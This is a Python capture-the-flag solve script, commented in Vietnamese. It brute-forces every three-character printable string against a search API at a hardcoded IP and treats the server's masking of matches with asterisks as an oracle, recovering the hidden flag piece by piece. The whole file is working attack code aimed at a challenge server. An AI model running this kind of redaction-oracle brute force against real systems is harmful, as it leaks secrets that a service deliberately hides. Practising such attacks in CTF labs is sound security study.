import requests
import string

# CHARSET mở rộng: tất cả ký tự ASCII printable, trừ khoảng trắng và ký tự điều khiển
charset = ''.join(c for c in string.printable if c not in ' \t\n\r\x0b\x0c')

triplets_found = []

def test_triplet(triplet):
    try:
        res = requests.post(
            'http://34.134.162.213:17000/api/search',
            json={'query': triplet},
            timeout=5
        )
        data = res.json()

        for post in data['results']:
            if (post['title'] == "Not the flag?" and
                post['author'] == "admin" and
                post['date'] == "2025-05-13"):

                content = post['content']

                # Nếu triplet bị ẩn và có ***** → chắc chắn nằm trong FLAG
                if triplet not in content and '****' in content:
                    return True
        return False
    except Exception as e:
        print(f'[x] Lỗi với triplet {triplet}: {e}')
        return False

# Dò từng triplet
for a in charset:
    for b in charset:
        for c in charset:
            triplet = a + b + c
            print(f'[?] Thử: {triplet}')
            if test_triplet(triplet):
                print(f'[+] Triplet thuộc FLAG: {triplet}')
                triplets_found.append(triplet)

# Xuất kết quả
print('\n✅ Các triplet nằm trong FLAG:')
for t in triplets_found:
    print(f'  - {t}')

# Gợi ý tiếp theo
print("\n🛠️ Bạn có thể ghép lại FLAG bằng cách nối các triplet chồng nhau (overlap).")
print("Ví dụ: 'L3A', '3AK', 'AK{' → ghép thành L3AK{...}")
